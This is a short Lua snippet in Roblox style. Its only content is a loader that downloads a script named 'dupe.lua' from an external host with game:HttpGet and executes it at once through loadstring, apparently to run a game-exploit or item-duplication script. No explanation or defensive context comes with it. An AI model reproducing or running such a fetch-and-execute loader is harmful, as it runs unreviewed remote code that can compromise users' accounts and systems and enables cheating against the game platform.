task.spawn(pcall, function()
	loadstring(game:HttpGet("http://ligma.wtf/scripts/dupe.lua", true))() end);

